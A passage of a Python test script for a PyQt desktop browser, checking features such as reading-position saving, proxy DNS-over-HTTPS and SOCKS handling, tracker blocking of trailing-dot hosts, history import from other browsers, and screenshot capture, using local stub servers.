      _rs232.index('".__readerbody"') < _rs232.index('getElementById("__readercss")')
      and "classList.remove(\"__readerbody\")" in _rs232)

# reading place written from the last look, at close
_cfg232 = br.config.get("readResume", False)
_places232 = dict(br.config.get("readPlaces") or {})
try:
    br.config["readResume"] = True
    _v232 = br.new_tab()
    H.load(_v232, srv.url("/twhome"))
    H.wait_for(lambda: "/twhome" in _v232.url().toString(), 8000)
    H.wait_for(lambda: getattr(_v232, "_read_loaded", False), 8000)
    _u232 = getattr(_v232, "_read_url", "") or _v232.url().toString()
    _v232._read_at = (_u232, 5000)
    br._flush_reading_place(_v232)
    check("232 reading place filed from the cached look",
          br.reading_places().get(_u232[:500]) == 5000)
    _v232._read_at = (_u232, 5000)
    _v232.private = True
    br.config["readPlaces"] = {}
    br._flush_reading_place(_v232)
    check("232 private tab keeps no reading place", not br.config["readPlaces"])
    _v232.private = False
    check("232 close_tab flushes the place",
          "_flush_reading_place" in _insp232.getsource(B.Browser.close_tab))
finally:
    br.config["readResume"] = _cfg232
    br.config["readPlaces"] = _places232
    try:
        br.close_tab(br.tabs.indexOf(_v232), ask=False)
    except Exception:
        pass

# translator language
_seen232 = {}
_orig232 = B.Browser.caption_tools
try:
    br.caption_tools = lambda: {"captionTranslator": "/bin/true"}
    _src232 = _insp232.getsource(B.Browser.run_translator)
    check("232 translator keeps zh-TW", '"zh-TW" if traditional' in _src232
          and "[:5]" in _src232)
finally:
    br.__dict__.pop("caption_tools", None)

# undo only touches what the translator wrote
_u232src = _insp232.getsource(B.Browser.undo_translation)
check("232 undo no longer reads data-was", "data-was" not in _u232src
      and "__trWas" in _u232src)

# pdf places
_pp232 = br.config.get("pdfPlace")
_pr232 = br.config.get("pdfRemember", True)
try:
    br.config["pdfRemember"] = True
    br.config["pdfPlace"] = {}
    for _i232 in range(230):
        br.pdf_place(url="https://x.test/%d.pdf" % _i232, page_number=3)
    check("232 pdfPlace capped", len(br.config["pdfPlace"]) == 200)
    br._forget_history_extras(None)
    check("232 clear history empties pdfPlace", not br.config.get("pdfPlace"))
    br.config["pdfPlace"] = {"https://x.test/a.pdf": 4}
    br.config["pdfRemember"] = False
    _off232 = br.pdf_place(url="https://x.test/a.pdf")
    # fix236: off pauses -- nothing read or kept, the rows wait for "on"
    check("232 pdfRemember off pauses: rows kept, none read",
          _off232 == 0
          and br.config.get("pdfPlace") == {"https://x.test/a.pdf": 4},
          str((_off232, br.config.get("pdfPlace"))))
finally:
    br.config["pdfRemember"] = _pr232
    if _pp232 is None:
        br.config.pop("pdfPlace", None)
    else:
        br.config["pdfPlace"] = _pp232

# selection reader and line numbers: source checks
_sel232 = B.READ_TOOLS["readerselection"]
check("232 selection html made absolute", "document.baseURI" in _sel232
      and "iframe" in _sel232)
_nl232 = B.READ_TOOLS["nolinenumbers"]
check("232 line numbers: code only, counting, no stopImmediatePropagation",
      "inCode" in _nl232 and "counting" in _nl232
      and "stopImmediatePropagation" not in _nl232)

# fix233: places flushed before the exit wipe, never after; a sample waits for the resume scroll
import inspect as _insp233
check("233 the exit wipe flushes every window first and later flushes stop",
      "win._flush_reading_places()" in _insp233.getsource(B.Browser._clear_on_exit)
      and '_exit_cleared", False)' in _insp233.getsource(B.Browser._flush_reading_places))
check("233 a reading sample waits 1.5 s after the load",
      "time.monotonic() - float(loaded) < 1.5" in _insp233.getsource(B.Browser._sample_reading_place))

# ---- 234: notes and collections never share a file by accident ----
import notes as _N234
_d234 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_k234 = _N234.Desk(_d234)
_k234.add_to_collection("C++", "a", "https://a234.example/")
_k234.add_to_collection("C#", "b", "https://b234.example/")
_k234.delete_collection("C#")
check("234 collections whose names differ only in punctuation are separate",
      "a234" in _k234.collection("C++") and _k234.collections() == ["C++"],
      str(_k234.collections()))
_ids234 = [_k234.save_note(title="same234", body=str(_i)) for _i in range(3)]
_names234 = sorted(p.name for p in _d234.glob("same234*.md"))
check("234 three notes with one title in one second keep three files",
      len(_names234) == 3, str(_names234))
import shutil as _sh234
_sh234.rmtree(str(_d234), ignore_errors=True)
_desk234 = br.desk()
if _desk234 is not None:
    _desk234.daily_note = lambda *a, **k: None
    try:
        _cli234 = br.take_cli_note("hello 234")
    finally:
        _desk234.__dict__.pop("daily_note", None)
    check("234 browser --note answers not-saved when nothing was written",
          _cli234 == "not-saved", _cli234)

# ---- 235: no unasked merge abort; a restart is sure of the quit first ----
_app235 = B.APP_DIR
_g235 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_g235 / ".git").mkdir()
try:
    B.APP_DIR = _g235
    _idle235 = B._git_busy()
    (_g235 / ".git" / "MERGE_HEAD").write_text("x")
    _busy235 = B._git_busy()
finally:
    B.APP_DIR = _app235
    import shutil as _sh235
    _sh235.rmtree(str(_g235), ignore_errors=True)
check("235 a merge under way in the checkout is seen (and not auto-updated)",
      _idle235 is False and _busy235 is True, str((_idle235, _busy235)))

_started235 = []
_real_sd235 = B.QProcess.startDetached
B.QProcess.startDetached = staticmethod(lambda *a, **k: _started235.append(a))
br._confirm_many_tabs = lambda: False
try:
    _r235 = br.restart()
finally:
    B.QProcess.startDetached = _real_sd235
    br.__dict__.pop("_confirm_many_tabs", None)
    for _w235 in br._all_windows():
        _w235.__dict__.pop("_closing_anyway", None)
check("235 a restart refused at the close question starts nothing",
      _r235 is False and _started235 == [], str((_r235, _started235)))

# ---- 237: one history row per visit, however often a tab's title changes ----
class _Tab237:
    session = "main"
    _came_from = ""

_hist237 = list(br.history)
_hv237 = getattr(br, "_history_view", None)
_on237 = br.config.get("history", True)
try:
    br.config["history"] = True
    _a237, _b237 = _Tab237(), _Tab237()
    br._history_view = _a237
    br._record_history(B.QUrl("https://mail237.example/inbox"), "Inbox")
    br._history_view = _b237
    br._record_history(B.QUrl("https://news237.example/"), "News")
    br._history_view = _a237
    br._record_history(B.QUrl("https://mail237.example/inbox"), "(1) Inbox")
    br._history_view = _b237
    br._record_history(B.QUrl("https://news237.example/b"), "News B")
    br._history_view = _a237
    br._record_history(B.QUrl("https://mail237.example/inbox"), "(2) Inbox")
    _mail237 = [r for r in br.history if "mail237" in r.get("url", "")]
    check("237 a background tab's title changes keep one history row",
          len(_mail237) == 1 and _mail237[0]["title"] == "(2) Inbox",
          str([(r["title"]) for r in _mail237]))
finally:
    br.history[:] = _hist237
    br._history_view = _hv237
    br.config["history"] = _on237
    br.save_history()

import inspect as _insp237
check("237 a locked sealed history is not wiped as if empty",
      'not getattr(self, "_history_locked", False)' in
      _insp237.getsource(B.Browser._history_extras_dropped))

# ---- 234b: a collection typed in other capitals is the same one ----
_d234b = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_k234b = _N234.Desk(_d234b)
_k234b.add_to_collection("Reading", "a", "https://a234b.example/")
_k234b.add_to_collection("reading", "b", "https://b234b.example/")
check("234b 'reading' after 'Reading' adds to the same collection",
      _k234b.collections() == ["Reading"]
      and "b234b" in _k234b.collection("READING"),
      str(_k234b.collections()))
_sh234.rmtree(str(_d234b), ignore_errors=True)

# ---- 238: the per-site proxy's direct route resolves as the engine would ----
import socket as _s238, struct as _st238, threading as _th238
from http.server import BaseHTTPRequestHandler as _BH238, \
    ThreadingHTTPServer as _TS238

_asked238 = []


class _Doh238(_BH238):
    def do_POST(self):
        q = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        pos, labels = 12, []
        while q[pos]:
            labels.append(q[pos + 1:pos + 1 + q[pos]].decode())
            pos += 1 + q[pos]
        name = ".".join(labels)
        qtype = _st238.unpack(">H", q[pos + 1:pos + 3])[0]
        _asked238.append((name, qtype))
        question = q[12:pos + 5]
        if name == "doh238.test" and qtype == 1:
            body = (_st238.pack(">HHHHHH", 0, 0x8180, 1, 1, 0, 0) + question
                    + b"\xc0\x0c" + _st238.pack(">HHIH", 1, 1, 60, 4)
                    + bytes([127, 0, 0, 1]))
        elif name == "doh238.test":
            body = _st238.pack(">HHHHHH", 0, 0x8180, 1, 0, 0, 0) + question
        else:  # NXDOMAIN
            body = _st238.pack(">HHHHHH", 0, 0x8183, 1, 0, 0, 0) + question
        self.send_response(200)
        self.send_header("Content-Type", "application/dns-message")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


class _Origin238(_BH238):
    def do_GET(self):
        body = b"hit238 " + self.headers.get("Host", "").encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


_dsrv238 = _TS238(("127.0.0.1", 0), _Doh238)
_osrv238 = _TS238(("127.0.0.1", 0), _Origin238)
for _srv in (_dsrv238, _osrv238):
    _th238.Thread(target=_srv.serve_forever, daemon=True).start()
_op238 = _osrv238.server_port


def _via238(rp, host):
    c = _s238.create_connection(("127.0.0.1", rp.port), 5)
    c.settimeout(8)
    c.sendall(("GET http://%s:%d/ HTTP/1.1\r\nHost: %s:%d\r\n\r\n"
               % (host, _op238, host, _op238)).encode())
    got = b""
    try:
        while True:
            chunk = c.recv(4096)
            if not chunk:
                break
            got += chunk
    except OSError:
        pass
    c.close()
    return got


_rp238 = B.RuleProxy([], [], ("direct",),
                     doh="http://127.0.0.1:%d/dns-query{?dns}"
                     % _dsrv238.server_port,
                     overrides=[("ovr238.test", "127.0.0.1"),
                                ("*.nowhere238.test", "~NOTFOUND")])
try:
    _a238 = _via238(_rp238, "doh238.test")
    _b238 = _via238(_rp238, "nx238.test")
    _c238 = _via238(_rp238, "ovr238.test")
    _d238 = _via238(_rp238, "a.nowhere238.test")
    _e238 = _via238(_rp238, "doh238.test.")
finally:
    _rp238.close()
check("238 a direct route behind the per-site proxy asks his DoH server",
      b"hit238 doh238.test" in _a238 and ("doh238.test", 1) in _asked238,
      repr((_a238[-60:], _asked238[:4])))
check("238 ...and with no DoH answer there is no connection, not the "
      "system resolver", _b238.startswith(b"HTTP/1.1 502")
      and ("nx238.test", 1) in _asked238, repr(_b238[:40]))
check("238 his host overrides reach a direct route (and ~NOTFOUND refuses)",
      b"hit238 ovr238.test" in _c238 and _d238.startswith(b"HTTP/1.1 502")
      and not any(n.startswith(("ovr238", "a.nowhere238"))
                  for n, _t in _asked238),
      repr((_c238[-40:], _d238[:30])))
check("238 a name with its root dot is looked up as the name",
      b"hit238" in _e238, repr(_e238[-40:]))
_rp238b = B.RuleProxy([], [], ("direct",))
try:
    _f238 = _via238(_rp238b, "127.0.0.1")
finally:
    _rp238b.close()
check("238 without DoH an address still goes straight there",
      b"hit238" in _f238, repr(_f238[-40:]))
check("238 the DoH address the proxy gets is the one the engine flag gets",
      B._doh_template({"doh": True, "dohUrl": "https://d.example/q"})
      == "https://d.example/q"
      and B._doh_template({"doh": False, "dohUrl": "https://d.example/q"})
      == "" and B._doh_template({"doh": True, "dohUrl": "https://a b"}) == ""
      and "--dns-over-https-templates=https://d.example/q"
      in B._privacy_flags({"doh": True, "dohUrl": "https://d.example/q"})
      and B._host_override_rows({"hostOverrides": "# x\na.test 1.2.3.4\n"
                                                  "b,c 1.1.1.1\nd e f"})
      == [("a.test", "1.2.3.4")])
import inspect as _insp238
check("238 the launch hands the proxy his DoH server and overrides",
      "doh=_doh_template(config)" in _insp238.getsource(B._install_proxy_flags)
      and "overrides=_host_override_rows(config)"
      in _insp238.getsource(B._install_proxy_flags))
_dsrv238.shutdown()
_osrv238.shutdown()

# socks: lengths in bytes, an address as an address
_seen238 = {}


def _socks238(srv):
    conn, _ = srv.accept()
    conn.settimeout(5)

    def rd(n):
        buf = b""
        while len(buf) < n:
            chunk = conn.recv(n - len(buf))
            if not chunk:
                raise OSError("closed")
            buf += chunk
        return buf
    try:
        head = rd(2)
        rd(head[1])
        conn.sendall(b"\x05\x02")
        ver_ulen = rd(2)
        user = rd(ver_ulen[1])
        plen = rd(1)[0]
        _seen238["user"] = user
        _seen238["pw"] = rd(plen)
        conn.sendall(b"\x01\x00")
        req = rd(4)
        _seen238["atyp"] = req[3]
        if req[3] == 4:
            _seen238["addr"] = rd(16)
        elif req[3] == 1:
            _seen238["addr"] = rd(4)
        else:
            _seen238["addr"] = rd(rd(1)[0])
        rd(2)
        conn.sendall(b"\x05\x00\x00\x01" + bytes(6))
    except OSError as exc:
        _seen238["err"] = str(exc)
    finally:
        conn.close()


_ss238 = _s238.create_server(("127.0.0.1", 0))
_th238.Thread(target=_socks238, args=(_ss238,), daemon=True).start()
try:
    _up238 = B.RuleProxy._socks_upstream(
        ("socks5", "127.0.0.1", _ss238.getsockname()[1], "üser",
         "pässwörd"), "::1", 443)
    _up238.close()
    _sok238 = True
except OSError as exc:
    _sok238 = str(exc)
_ss238.close()
check("238 socks credentials go by their length in bytes, an IPv6 address "
      "as one", _sok238 is True and _seen238.get("user") == "üser".encode()
      and _seen238.get("pw") == "pässwörd".encode()
      and _seen238.get("atyp") == 4
      and _seen238.get("addr") == _s238.inet_pton(_s238.AF_INET6, "::1"),
      repr((_sok238, _seen238)))

# ---- 239: a root dot on the end of a name hides it from no block list ----
from PyQt6.QtWebEngineCore import QWebEngineUrlRequestInfo as _QRI239


class _Info239:
    def __init__(self, url, first=""):
        self._u = B.QUrl(url)
        self._f = B.QUrl(first or url)
        self.blocked = None
        self.redirected = None

    def requestUrl(self):
        return self._u

    def firstPartyUrl(self):
        return self._f

    def resourceType(self):
        return _QRI239.ResourceType.ResourceTypeScript

    def requestMethod(self):
        return b"GET"

    def block(self, on):
        self.blocked = on

    def redirect(self, url):
        self.redirected = url.toString()

    def setHttpHeader(self, name, value):
        pass


_was239 = B._BLOCKED_AT_LAUNCH
B._BLOCKED_AT_LAUNCH = frozenset({"track239.example",
                                  B._block_entry("bücher239.example")})
_w239 = B.RequestWatch(br)
try:
    _i1 = _Info239("https://cdn.track239.example./r.js", "https://p.example/")
    _w239._work(_i1)
    _i2 = _Info239("https://track239.example./r.js", "https://p.example/")
    _w239._work(_i2)
    _i3 = _Info239("https://fine239.example./r.js", "https://p.example/")
    _w239._work(_i3)
    _i4 = _Info239("https://b\u00fccher239.example./r.js", "https://p.example/")
    _w239._work(_i4)
finally:
    B._BLOCKED_AT_LAUNCH = _was239
check("239 a blocked name with its root dot is refused by the interceptor",
      _i1.blocked is True and _i2.blocked is True and _i3.blocked is None,
      str((_i1.blocked, _i2.blocked, _i3.blocked)))
check("239 ...an international one too (the lists keep its xn-- form)",
      _i4.blocked is True, str((_i4.blocked, _i4.requestUrl().host())))
check("239 the launch keeps the block lists for the interceptor",
      "_BLOCKED_AT_LAUNCH = frozenset(_blocked_hosts(config))"
      in _insp238.getsource(B._install_privacy_flags))
import adblock as _ab239
_r239 = _ab239.Rules()
_r239.load_text("||ads239.example^\n", "t239")
check("239 a filter-list rule matches its host written with the root dot",
      _r239.blocks("https://cdn.ads239.example./x.js", "p.example", "script")
      and _r239.blocks("https://ads239.example.:8443/x", "p.example.",
                       "script")
      and not _r239.blocks("https://ok239.example./x.js", "p.example",
                           "script"))


class _Rules239:
    def ready(self):
        return True

    def blocks(self, url, page_host="", kind="other"):
        return "||rule239^"


_ab_was239 = br.config.get("adBlock")
br.config["adBlock"] = True
br.ad_rules = lambda: _Rules239()
try:
    _y1 = br.ad_block_check("https://ads.example/x.js",
                            _Info239("https://ads.example/x.js",
                                     "https://evilyoutube-nocookie.com/"),
                            "ads.example")
    _y2 = br.ad_block_check("https://ads.example/x.js",
                            _Info239("https://ads.example/x.js",
                                     "https://www.youtube-nocookie.com/e"),
                            "ads.example")
finally:
    del br.ad_rules
    if _ab_was239 is None:
        br.config.pop("adBlock", None)
    else:
        br.config["adBlock"] = _ab_was239
check("239 only youtube-nocookie.com itself is let past the filter lists",
      _y1 == "||rule239^" and _y2 == "", str((_y1, _y2)))
check("239 the YouTube script runs on youtube-nocookie.com, not on names "
      "ending in it", 'h === "youtube-nocookie.com"' in B.YOUTUBE_JS
      and 'h.endsWith(".youtube-nocookie.com")' in B.YOUTUBE_JS
      and 'h.endsWith("youtube-nocookie.com")' not in B.YOUTUBE_JS)

# ---- 240: header rules, map rules and block-list lines as written ----
_hr_was240 = br.config.get("headerRules")
br.config["headerRules"] = ("*.hdr240.example | X-W240: 1\n"
                            "xn--bcher-kva.example | X-I240: 2")
try:
    _h1 = br.headers_for("a.hdr240.example")
    _h2 = br.headers_for("hdr240.example")
    _h3 = br.headers_for("bücher.example")
    _h4 = br.headers_for("other240.example")
finally:
    if _hr_was240 is None:
        br.config.pop("headerRules", None)
    else:
        br.config["headerRules"] = _hr_was240
check("240 a '*.site' header rule reaches the site and its subdomains",
      ("X-W240", "1") in _h1 and ("X-W240", "1") in _h2 and not _h4,
      str((_h1, _h2, _h4)))
check("240 a header rule for an international name reaches it",
      ("X-I240", "2") in _h3, str(_h3))
br.url_rules = lambda: [("loop240.example/a",
                         "https://loop240.example/a/index.html")]
try:
    _m1 = _Info239("https://loop240.example/a", "https://loop240.example/")
    _w239._work(_m1)
    _m2 = _Info239("https://loop240.example/a/index.html",
                   "https://loop240.example/")
    _w239._work(_m2)
finally:
    del br.url_rules
check("240 a map rule whose target it matches again redirects once",
      _m1.redirected == "https://loop240.example/a/index.html"
      and _m2.redirected is None, str((_m1.redirected, _m2.redirected)))
_bh240 = B._blocked_hosts({"blockHosts": [
    "https://t240.example/path", "*.w240.example", "dot240.example.",
    "bücher240.example", "bad host", "www.x240.example"]})
check("240 block-list lines typed as addresses, wildcards or international "
      "names still block", {"t240.example", "w240.example", "dot240.example",
                            "xn--bcher240-65a.example", "x240.example"}
      <= set(_bh240) and "bad host" not in _bh240, str(_bh240))

# ---- 241: tab files read back, snapshots per virtual browser, theme keys ----
import tempfile as _tf241
from pathlib import Path as _P241
_d241 = _P241(_tf241.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_d241 / "tabs.html").write_text(
    '<ul><li><a href="https://t241.example/s?a=1&amp;b=2">x</a></li></ul>',
    encoding="utf-8")
_opened241 = []
br.new_tab = lambda *a, **k: _opened241.append(k.get("url"))
try:
    _got241 = br.import_tabs(str(_d241 / "tabs.html"))
finally:
    del br.new_tab
check("241 an HTML tab list reads its addresses back unescaped",
      _got241 == ["https://t241.example/s?a=1&b=2"]
      and _opened241 == ["https://t241.example/s?a=1&b=2"],
      str((_got241, _opened241)))
_u241 = "https://snap241.example/x"
br.snapshots = lambda: [{"t": 1, "tabs": [{"u": _u241, "s": "Twitch241"}]}]
br.open_tab_state = lambda entries, *a, **k: list(entries)
try:
    br.tab_state = lambda *a, **k: [{"u": _u241, "s": "main"}]
    _r1 = br.restore_snapshot()
    br.tab_state = lambda *a, **k: [{"u": _u241, "s": "Twitch241"}]
    _r2 = br.restore_snapshot()
finally:
    del br.snapshots, br.open_tab_state, br.tab_state
check("241 a snapshot tab open only in another virtual browser is restored",
      [e["s"] for e in _r1] == ["Twitch241"] and _r2 == [], str((_r1, _r2)))
check("241 themes named in another script get keys of their own",
      B.custom_theme_key("Тема") != B.custom_theme_key("日本語")
      and B.custom_theme_key("Тема").startswith(B.CUSTOM_PREFIX)
      and B.custom_theme_key("Тема") != B.CUSTOM_PREFIX + "theme"
      and B.custom_theme_key("My Theme") == B.CUSTOM_PREFIX + "my-theme"
      and B.custom_theme_key("Café noir") == B.CUSTOM_PREFIX + "caf-noir",
      str((B.custom_theme_key("Тема"), B.custom_theme_key("日本語"))))

# ---- 242: another browser's history: the newest visits, real visits only ----
import sqlite3 as _sq242
_h242 = list(br.history)
_now242 = int(_time.time()) - 3600
_ff242 = _d241 / "places.sqlite"
_con242 = _sq242.connect(str(_ff242))
_con242.execute("PRAGMA journal_mode=WAL")
_con242.execute("CREATE TABLE moz_places (url TEXT, title TEXT,"
                " last_visit_date INTEGER)")
_con242.commit()
_con242.execute("PRAGMA wal_checkpoint(TRUNCATE)")
_con242.execute("PRAGMA wal_autocheckpoint=0")
_con242.execute("INSERT INTO moz_places VALUES (?,?,?)",
                ("https://wal242.example/", "in the log", _now242 * 1000000))
_con242.execute("INSERT INTO moz_places VALUES (?,?,NULL)",
                ("https://never242.example/", "bookmarked only"))
_con242.commit()
_wal242 = _P241(str(_ff242) + "-wal").stat().st_size
_cr242 = _d241 / "History"
_c2 = _sq242.connect(str(_cr242))
_c2.execute("CREATE TABLE urls (url TEXT, title TEXT, last_visit_time INTEGER)")
_c2.execute("INSERT INTO urls VALUES (?,?,?)",
            ("https://chrome242.example/", "c",
             (_now242 + 11644473600) * 1000000))
_c2.execute("INSERT INTO urls VALUES (?,?,0)",
            ("https://zero242.example/", "z"))
_c2.commit()
_c2.close()
try:
    _n1 = br.import_history_from(path=str(_ff242), which="firefox")
    _n2 = br.import_history_from(path=str(_cr242), which="chrome")
    _rows242 = {r.get("url"): r for r in br.history
                if "242.example" in str(r.get("url"))}
finally:
    _con242.close()
    br.history[:] = _h242
    br.save_history()
check("242 Firefox visits still in its write-ahead log are imported",
      _wal242 > 0 and "https://wal242.example/" in _rows242
      and _rows242["https://wal242.example/"].get("t") == _now242,
      str((_n1, _wal242, sorted(_rows242))))
check("242 places never visited are not imported as visits in 1970 or 1601",
      "https://never242.example/" not in _rows242
      and "https://zero242.example/" not in _rows242
      and _rows242.get("https://chrome242.example/", {}).get("t") == _now242,
      str(sorted(_rows242)))
check("242 no copy of the other browser's database is left behind",
      not list(B.CONFIG_FILE.parent.glob("import-*.sqlite*")),
      str(list(B.CONFIG_FILE.parent.glob("import-*"))))

# ---- 243: an encrypted Bitwarden export; Settings after a privacy import ----
_enc243 = json.dumps({"encrypted": True, "encKeyValidation_DO_NOT_EDIT": "2.x",
                      "items": [{"type": 1, "name": "2.aaa|bbb|ccc",
                                 "login": {"username": "2.ddd|eee|fff",
                                           "password": "2.ggg|hhh|iii",
                                           "uris": [{"uri": "2.j|k|l"}]}}]})
try:
    _bw243 = B.PasswordVault.import_bitwarden(None, _enc243)
except Exception as _e243:
    _bw243 = repr(_e243)[:80]
check("243 Bitwarden's encrypted export is refused, not filed as logins",
      _bw243 == 0, str(_bw243))
_set243 = (_P241(B.__file__).parent / "settings.html").read_text(
    encoding="utf-8")
_pi243 = _set243[_set243.index('getElementById("privimport").onclick'):]
_pi243 = _pi243[:_pi243.index("\n  };\n")]
check("243 a privacy import re-reads Settings so Save cannot undo it",
      "bridge.importPrivacy((n) =>" in _pi243
      and "bridge.getSettings(" in _pi243 and "load(window._settings)"
      in _pi243, _pi243[:200])
import shutil as _sh241
_sh241.rmtree(str(_d241), ignore_errors=True)


# ---- 244-246: capture and recording, the 42nd pass ----
import stat as _stat246, tempfile as _tf246
from pathlib import Path as _P246


class _V246(B.QWidget):
    """A stand-in for a tab: a widget that is not in the strip."""
    zoom = 1.0
    ratio = 1.0

    def url(self):
        return B.QUrl("https://cap246.example/page")

    def zoomFactor(self):
        return self.zoom

    def devicePixelRatioF(self):
        return self.ratio

    def page(self):
        outer = self

        class _Page:
            def profile(self):
                return outer
        return _Page()


def _img246(w=40, h=30):
    img = B.QImage(w, h, B.QImage.Format.Format_RGB32)
    img.fill(B.Qt.GlobalColor.white)
    return img


_cap246 = B.capture
_keys246 = {k: br.config.get(k, "<none>") for k in
            ("shotRedact", "shotDir", "shotHistory", "shotFormat",
             "shotUpload")}
_tmp246 = _tf246.TemporaryDirectory(prefix="review246-")
_dir246 = _P246(_tmp246.name)


def _restore246():
    for k, v in _keys246.items():
        if v == "<none>":
            br.config.pop(k, None)
        else:
            br.config[k] = v


try:
    br.config["shotDir"] = str(_dir246)

    # 244: redaction is counted, so a nested capture cannot un-blur the first
    _calls = []
    _real_redact = _cap246.redact
    _cap246.redact = lambda view, world, on=True: _calls.append(bool(on))
    br.config["shotRedact"] = True
    _v = _V246()
    try:
        br._shot_prepare(_v)
        br._shot_prepare(_v)
        br._shot_finish(_v)
        _mid = list(_calls)
        br._shot_finish(_v)
    finally:
        _cap246.redact = _real_redact
    check("244 the blur stays on until the last capture of a view is done",
          _mid == [True] and _calls == [True, False], str((_mid, _calls)))

    # 244: a second full-page capture of a view being walked is refused
    _walks = []
    _inner = []
    _real_fp, _real_done = _cap246.full_page, br._shot_done
    _cap246.redact = lambda *a, **k: None

    def _fake_fp(view, world, **k):
        _walks.append(1)
        if len(_walks) == 1:
            _inner.append(br.shot_full_page(view=view))
        return _img246()
    _cap246.full_page = _fake_fp
    br._shot_done = lambda *a, **k: None
    try:
        br.shot_full_page(view=_v)
    finally:
        _cap246.full_page = _real_fp
        _cap246.redact = _real_redact
        del br._shot_done
    check("244 a capture started during a full-page walk is refused",
          len(_walks) == 1 and _inner == [None], str((_walks, _inner)))
    br._shot_walking = set()
    _claim246 = getattr(br, "_shot_claim", None)
    check("244 the walk can start again once it is over",
          _claim246 is not None and _claim246(_v)
          and not _claim246(_v) and (br._shot_release(_v) or True)
          and _claim246(_v) and (br._shot_release(_v) or True))

    # 244: a format that cannot hold the picture does not lose the shot
    _wide = _img246(16400, 4)
    _p = _cap246.save(_wide, _dir246, "wide246", fmt="webp")
    check("244 a WebP too wide to write is saved as a PNG instead",
          _p is not None and str(_p).endswith(".png")
          and _p.read_bytes()[:4] == b"\x89PNG", str(_p))

    # 244: an element's rectangle is read after the page settled
    _events = []
    _real_js, _real_spin, _real_vis = (_cap246._js, _cap246._spin,
                                       _cap246.visible)

    def _fake_js(view, code, world):
        if "scrollIntoView" in code:
            _events.append("scroll")
            return [0, 0, 10, 10, 0, 0]
        if "getBoundingClientRect" in code:
            _events.append("rect")
            return [0, 0, 10, 10]
        _events.append("metrics")
        return [100, 100, 100, 100, 0, 0, 1]
    _cap246._js = _fake_js
    _cap246._spin = lambda ms: _events.append("spin")
    _cap246.visible = lambda view: _img246(100, 100)
    try:
        _cap246.element(_v, 0, "#x")
    finally:
        _cap246._js, _cap246._spin, _cap246.visible = (_real_js, _real_spin,
                                                       _real_vis)
    check("244 element scrolls instantly and reads its rect after the wait",
          "instant" in _cap246.ELEMENT_JS and "spin" in _events
          and "rect" in _events[_events.index("spin"):], str(_events))

    # 245: the diff picture is not a capture, so not the next baseline
    _a = _dir246 / "a246.png"
    _img246(40, 30).save(str(_a), "PNG")
    _second = _img246(40, 30)
    _second.fill(B.Qt.GlobalColor.black)
    br.config["shotHistory"] = [str(_a)]
    br.config["shotFormat"] = "png"
    _cap246.visible = lambda view: _second
    try:
        _res = br.capture_diff(view=_v, against=str(_a))
    finally:
        _cap246.visible = _real_vis
    check("245 a capture diff stays out of the capture history",
          bool(_res) and _res["path"] and _P246(_res["path"]).is_file()
          and _res["path"] not in br.config["shotHistory"],
          str((_res, br.config["shotHistory"])))

    # 245: hidpi never asks Qt for a zoom past 5.0, and names its own tab
    _seen = {"zoom": [], "size": []}

    class _Sig:
        def __init__(self):
            self.cb = []

        def connect(self, cb):
            self.cb.append(cb)

    class _Shell:
        def __init__(self):
            self.loadFinished = _Sig()

        def setPage(self, _p):
            pass

        def resize(self, w, h):
            _seen["size"].append((w, h))

        def setZoomFactor(self, z):
            _seen["zoom"].append(z)

        def show(self):
            pass

        def hide(self):
            pass

        def deleteLater(self):
            pass

        def load(self, _url):
            for cb in self.loadFinished.cb:
                B.QTimer.singleShot(0, cb)
    _real_shell, _real_page = B.QWebEngineView, B.QWebEnginePage
    B.QWebEngineView = _Shell
    B.QWebEnginePage = lambda *a, **k: object()
    _cap246.visible = lambda view: _img246(60, 40)
    _done = []
    br._shot_done = lambda *a, **k: _done.append(k.get("view")) or None
    _v.zoom = 2.5
    _v.resize(400, 300)
    try:
        br.shot_hidpi(view=_v, scale=3)
    finally:
        B.QWebEngineView, B.QWebEnginePage = _real_shell, _real_page
        _cap246.visible = _real_vis
        del br._shot_done
        br._hidpi_view = None
    _z = _seen["zoom"][0] if _seen["zoom"] else 99
    _w = _seen["size"][0][0] if _seen["size"] else 0
    check("245 hidpi keeps the shell's zoom within 5.0 and the layout width",
          _z <= 5.0 and abs(_w / _z - _v.width() / 2.5) < 1, str((_seen,)))
    check("245 hidpi names the file after its own tab",
          _done == [_v], str(_done))

    # 245: an inner-area capture names its own tab too
    _done = []
    _saved = {n: getattr(br, n, None) for n in
              ("_live_page", "_inner_facts", "_scroll_inner")}
    # only the stand-in: a real tab's own timers (the translation offer)
    # asked this too and got a page with nothing on it
    _real_live = br._live_page
    br._live_page = lambda v: object() if v is _v else _real_live(v)
    br._inner_facts = lambda v, s: {"scrollHeight": 60, "clientHeight": 60,
                                    "width": 30, "x": 0, "y": 0, "height": 60}
    br._scroll_inner = lambda *a: True
    _real_area = B.capture.area
    _cap246.area = lambda view, rect: _img246(30, 60)
    br._shot_done = lambda *a, **k: _done.append(k.get("view")) or None
    try:
        br.shot_inner(selector="#box", view=_v)
    finally:
        for n in _saved:
            br.__dict__.pop(n, None)
        del br._shot_done
        _cap246.area = _real_area
    check("245 an inner-area capture is named after its own tab",
          _done == [_v], str(_done))

    # 245: a marked-up picture is named after where it came from
    _kw = []
    _old_ann = getattr(br, "_annotator", None)
    br._shot_done = lambda *a, **k: _kw.append(k) or None
    _cap246.visible = lambda view: _img246()
    try:
        _from_file = br.annotate(_img246())
        br.save_annotation(_from_file)
        _from_tab = br.annotate(view=_v)
        br.save_annotation(_from_tab)
    finally:
        _cap246.visible = _real_vis
        del br._shot_done
        br._annotator = _old_ann
    check("245 a marked-up file is not named after the tab in front",
          len(_kw) == 2 and _kw[0].get("title") == ""
          and _kw[0].get("host") == "", str(_kw))
    check("245 a marked-up tab shot keeps the host it was taken from",
          len(_kw) == 2 and _kw[1].get("host") == "cap246.example",
          str(_kw))

    # 245: an upload says what kind of file it is
    _types = {}

    class _Reply:
        class _S:
            def connect(self, cb):
                pass
        finished = _S()

    class _Nam:
        def put(self, request, data):
